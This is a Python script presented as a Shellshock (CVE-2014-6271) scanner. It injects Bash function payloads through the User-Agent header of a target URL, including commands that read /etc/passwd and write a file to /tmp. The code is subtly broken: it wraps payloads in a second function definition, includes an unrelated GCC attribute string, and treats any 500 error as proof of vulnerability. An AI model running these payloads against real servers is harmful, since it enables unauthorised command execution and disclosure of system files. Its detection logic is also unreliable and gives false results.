#!/usr/bin/env python3
"""
Shellshock CVE-2014-6271 Scanner
Usage: python shellshock.py https://target.com/cgi-bin/test
"""

import sys
import requests

class ShellshockScanner:
    def __init__(self, url):
        self.url = url
        self.findings = []
        
        self.payloads = [
            '() { :; }; echo VULNERABLE',
            '() { :; }; /bin/cat /etc/passwd',
            '() { :; }; echo PWNED',
            '() { _; } __attribute__((__section__("data")))',
            '() { :; }; touch /tmp/shellshock',
        ]
    
    def test(self, payload):
        """Test for shellshock"""
        headers = {'User-Agent': f'() {{ {payload} }}'}
        try:
            r = requests.get(self.url, headers=headers, timeout=10)
            if 'VULNERABLE' in r.text or 'PWNED' in r.text:
                return True
            if r.status_code == 500:
                return True
        except:
            pass
        return False
    
    def scan(self):
        """Scan"""
        print(f"[*] Scanning {self.url}...")
        
        for payload in self.payloads:
            if self.test(payload):
                print(f"[!] VULNERABLE to Shellshock!")
                self.findings.append({'payload': payload})
                break
        
        return self.findings


def main():
    if len(sys.argv) < 2:
        print("Usage: python shellshock.py <url>")
        sys.exit(1)
    
    scanner = ShellshockScanner(sys.argv[1])
    scanner.scan()


if __name__ == "__main__":
    main()